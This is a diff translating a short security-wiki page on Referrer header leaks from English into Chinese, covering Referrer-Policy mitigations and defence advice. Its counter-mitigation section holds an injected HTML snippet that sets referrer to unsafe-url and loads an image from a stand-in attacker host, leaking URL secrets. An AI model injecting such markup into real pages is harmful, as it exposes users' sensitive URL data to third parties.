@@ -1,17 +1,16 @@
 {{#include ./banners/hacktricks-training.md}}
 
-# Referrer headers and policy
+# 引荐头和策略
 
-Referrer is the header used by browsers to indicate which was the previous page visited.
+引荐是浏览器用来指示上一个访问页面的头部。
 
-## Sensitive information leaked
+## 敏感信息泄露
 
-If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
+如果在某个网页中，任何敏感信息位于GET请求参数中，如果该页面包含指向外部资源的链接，或者攻击者能够使/建议（社交工程）用户访问由攻击者控制的URL。它可能能够提取最新GET请求中的敏感信息。
 
-## Mitigation
+## 缓解措施
 
-You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:
-
+您可以让浏览器遵循一个**Referrer-policy**，以**避免**将敏感信息发送到其他Web应用程序：
 ```
 Referrer-Policy: no-referrer
 Referrer-Policy: no-referrer-when-downgrade
@@ -22,19 +21,15 @@ Referrer-Policy: strict-origin
 Referrer-Policy: strict-origin-when-cross-origin
 Referrer-Policy: unsafe-url
 ```
+## 反制措施
 
-## Counter-Mitigation
-
-You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):
-
+您可以使用 HTML meta 标签覆盖此规则（攻击者需要利用 HTML 注入）：
 ```markup
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
+## 防御
 
-## Defense
-
-Never put any sensitive data inside GET parameters or paths in the URL.
+永远不要将任何敏感数据放入GET参数或URL中的路径。 
 
 {{#include ./banners/hacktricks-training.md}}
-
